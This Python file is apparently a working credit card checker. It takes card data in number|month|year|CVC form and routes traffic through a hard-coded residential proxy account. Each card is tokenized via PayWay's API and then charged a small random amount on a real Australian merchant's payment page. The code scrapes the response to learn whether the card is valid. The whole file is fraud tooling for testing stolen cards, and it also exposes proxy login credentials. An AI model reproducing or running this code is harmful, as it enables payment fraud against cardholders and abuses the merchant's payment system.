import requests,re
import random
from proxy import reqproxy, make_request
def Tele(ccx):
	proxy_str = "bd.porterproxies.com:8888:user-PP_FBBG3PY7GO-country-US-plan-luminati:nsugwlie"
	session, ip = reqproxy(proxy_str)
	#print(f"IP Address: {ip}")
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()
	
	random_amount1 = random.randint(1, 9)
	random_amount2 = random.randint(1, 99)
	
	headers = {
	    'authority': 'api.payway.com.au',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'authorization': 'Basic UTMwMDAwX1BVQl9manV3OWhkZHNrZmN2Z3F2OW1ocHlwNG44cmtoZnNyZmU5OWFnNnluZHdhZjY1ajRuM254NjRkbnVhaXE6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://api.payway.com.au',
	    'referer': 'https://api.payway.com.au/rest/v1/creditCard-iframe.htm',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-no-authenticate-basic': 'true',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	data = {
	    'paymentMethod': 'creditCard',
	    'connectionType': 'FRAME',
	    'cardNumber': f'{n}',
	    'cvn': f'{cvc}',
	    'cardholderName': 'Dao Khao Saard',
	    'expiryDateMonth': f'{mm}',
	    'expiryDateYear': f'{yy}',
	    'threeDS2': 'false',
	}
	
	response = session.post('https://api.payway.com.au/rest/v1/single-use-tokens', headers=headers, data=data)
	
	tok = response.json()['singleUseTokenId']
	#print(tok)
	
	headers = {
	    'authority': 'www.hutcheonandpearce.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://www.hutcheonandpearce.com.au',
	    'referer': 'https://www.hutcheonandpearce.com.au/secure-payments/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = {
	    'transactionType': 'payment',
	    'orderNumber': '1000',
	    'customerName': 'Dao Khao Saard',
	    'customerNumber': '1',
	    'principalAmount': f'{random_amount1}.{random_amount2}',
	    'singleUseTokenId': f'{tok}',
	}
	
	response = session.post('https://www.hutcheonandpearce.com.au/process-payment', headers=headers, data=data)
	
	try:
		result = re.search(r'<br>Response Text : (.*?)      </div>', response.text).group(1)
	except:
		result = re.search(r'<strong>PayWay (.*?)<', response.text).group(1)
		
	return (result)
